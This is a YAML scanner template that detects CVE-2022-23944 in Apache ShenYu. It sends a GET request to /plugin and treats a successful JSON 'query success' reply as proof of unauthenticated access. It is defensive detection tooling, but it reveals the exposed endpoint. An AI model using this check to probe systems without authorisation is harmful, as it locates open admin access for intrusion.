name: yaml-poc-apache-shenyu-unauthorized_access-CVE-2022-23944
binding: 83a29ff4-3217-4bcf-b76d-f85ed5b6c9f9
detail:
    author: jiapeng.han
    links:
        - http://www.openwall.com/lists/oss-security/2022/01/25/15
        - http://www.openwall.com/lists/oss-security/2022/01/25/5
        - http://www.openwall.com/lists/oss-security/2022/01/26/2
        - https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y
        - https://nvd.nist.gov/vuln/detail/CVE-2022-23944
        - https://seclists.org/oss-sec/2022/q1/74
        - https://www.cybersecurity-help.cz/vdb/SB2022012522
    vulnerability:
        id: f1440465-f774-4052-a976-50ece3857e88
        level: critical
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /plugin
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("\"message\":\"query success\"") && response.body_string.contains("\"code\":200") && response.headers["Content-Type"].contains("application/json")
expression: r0()
